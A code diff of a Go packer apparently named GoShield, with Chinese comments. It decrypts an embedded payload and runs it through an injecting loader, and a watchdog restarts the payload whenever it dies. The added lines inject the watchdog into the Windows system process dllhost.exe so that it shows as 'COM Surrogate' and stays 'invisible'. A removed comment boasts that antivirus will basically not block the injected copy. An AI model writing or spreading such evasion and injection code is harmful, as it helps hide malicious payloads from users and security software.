@@ -34,7 +34,6 @@ type MSG struct {
 // 强行消除 Windows 的鼠标转圈等待状态
 func stopLoadingCursor() {
 	var msg MSG
-	// 强行调用一次 PeekMessage，Windows 收到反馈后会立刻取消“AppStarting”鼠标等待状态
 	procPeekMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0, 1) // 1 = PM_REMOVE
 }
 
@@ -80,7 +79,7 @@ func extractAndDecrypt(exePath string) ([]byte, error) {
 }
 
 func main() {
-	// 🌟 第一时间调用！让鼠标连 0.1 秒的转圈都不会有！
+	// 第一时间调用！让鼠标连 0.1 秒的转圈都不会有！
 	stopLoadingCursor()
 
 	exePath, err := os.Executable()
@@ -118,7 +117,7 @@ func main() {
 				}
 			}
 
-			// 🌟 修复：加入重启冷却机制。防止被加壳的程序本身有致命报错导致瞬间连续崩溃，引发 CPU 100% 耗尽的无限重启死循环
+			// 加入重启冷却机制，防止无限崩溃重启
 			time.Sleep(1 * time.Second)
 
 			decryptedPayload, err := extractAndDecrypt(originalExe)
@@ -126,6 +125,7 @@ func main() {
 				break
 			}
 			
+			// 保护对象复活，主程序依然以自身的面貌启动，保障 GUI 兼容
 			newPID, err := loader.ExecuteAsync(originalExe, decryptedPayload)
 			if err != nil {
 				break
@@ -141,6 +141,7 @@ func main() {
 		os.Exit(1)
 	}
 
+	// 核心主程序注入自身，解决 GUI 兼容问题，任务管理器里显示您的正牌程序名
 	payloadPID, err := loader.ExecuteAsync(exePath, decryptedPayload)
 	if err != nil {
 		os.Exit(1)
@@ -150,9 +151,11 @@ func main() {
 	if err == nil {
 		os.Setenv("GOSHIELD_SHADOW_PID", strconv.Itoa(int(payloadPID)))
 		os.Setenv("GOSHIELD_ORIGINAL_EXE", exePath)
-		// 🌟 修复：放弃注入高危的 svchost.exe，改为注入自身的分身 (exePath)。
-		// 彻底解决 GUI 子系统不匹配导致的窗口渲染异常，同时由于同名同路径同特征，杀毒软件基本不会拦截！
-		loader.ExecuteAsync(exePath, myExeBytes)
+		
+		// 🌟 修复：为了隐藏任务管理器里的“双胞胎”，我们将保镖注入到系统 dllhost.exe 中。
+		// 在任务管理器中它会显示为 "COM Surrogate" 或 "COM 代理"，绝对的隐形！
+		sysDir := os.Getenv("WINDIR") + "\\System32\\dllhost.exe"
+		loader.ExecuteAsync(sysDir, myExeBytes)
 	}
 
 	os.Exit(0)
